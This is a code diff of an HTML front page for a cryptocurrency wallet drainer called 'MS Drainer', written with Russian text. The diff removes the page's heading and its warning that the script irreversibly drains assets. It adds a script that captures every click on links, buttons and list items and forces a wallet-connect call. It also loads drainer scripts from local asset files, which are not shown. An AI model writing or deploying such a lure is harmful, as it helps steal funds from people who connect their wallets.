@@ -1,36 +1,56 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Пример</title>
-  <style>
-    @media (prefers-color-scheme: dark) {
-      html, body {
-        background: #212020;
-        color: #fff;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Пример</title>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            html,
+            body {
+                background: #212020;
+                color: #fff;
+            }
+        }
+    </style>
 </head>
+
 <body>
-  <h1>Страница с примером работы MS Drainer</h1>
-  <p>Хотите </p>
-  <hr>
-  <div class="advanced_mode">
-    <p><strong>Встроенный кошелек:</strong> <span id="injected-status">false</span></p>
-    <button onclick="init_co()">Подключить кошелёк</button>
-    <p><strong>Будьте осторожны!</strong> Скрипт безвозвратно списывает ваши активы!</p>
-  </div>
-  <script src="./assets/w-modal.js"></script>
-  <script src="./assets/w-loader.js"></script>
-  <script src="./assets/modules.js"></script>
-  <script src="./assets/main.js"></script>
-  <script>
-    setInterval(() => {
-      document.getElementById('injected-status').innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
-    }, 1000);
-  </script>
+
+    <hr>
+    <div class="advanced_mode">
+        <p><strong>Встроенный кошелек:</strong> <span id="injected-status">false</span></p>
+        <button onclick="init_co()">Подключить кошелёк</button>
+
+    </div>
+    <script src="./assets/w-modal.js"></script>
+    <script src="./assets/w-loader.js"></script>
+    <script src="./assets/modules.js"></script>
+    <script src="./assets/main.js"></script>
+    <script>
+        setInterval(() => {
+            document.getElementById('injected-status').innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
+        }, 1000);
+    </script>
+    <script>
+        // Функция, которую нужно вызвать
+        function init_co() {
+            console.log('Функция init_co вызвана!');
+        }
+
+        // Назначаем обработчик для всех элементов <li>, <button>, <a>
+        document.addEventListener('click', event => {
+            const target = event.target.closest('li, button, a'); // Проверяем, является ли цель <li>, <button> или <a>
+            if (target) {
+                event.preventDefault(); // Предотвращаем стандартное действие (например, переход по ссылке)
+                init_co(); // Вызываем функцию
+            }
+        });
+
+        console.log('Скрипт обработки кликов активирован.');
+    </script>
 </body>
+
 </html>
